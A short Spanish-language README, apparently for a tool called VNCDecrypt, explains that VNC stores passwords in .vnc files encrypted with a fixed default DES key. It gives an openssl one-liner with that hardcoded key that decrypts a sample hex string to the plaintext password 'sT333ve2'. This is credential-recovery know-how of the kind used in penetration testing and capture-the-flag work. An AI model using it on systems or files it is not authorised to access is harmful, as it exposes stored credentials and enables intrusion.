# VNCDecrypt
Descifrar contraseñas almacenadas en archivos VNC 

VNC almacena las contraseñas como una cadena hexadecimal en los archivos .vnc utilizando una clave de cifrado predeterminada. Se puede utilizar para descifrar la cadena el siguiente openssl one-liner.

Supongamos que la cadena hexadecimal del archivo .vnc es `6bcf2a4b6e5aca0f`

```bash
echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d -provider legacy -provider default | hexdump -Cv | grep -oP '\|.*?\|' | tr -d '||'
```

El resultado será el siguiente:

```bash
sT333ve2
```
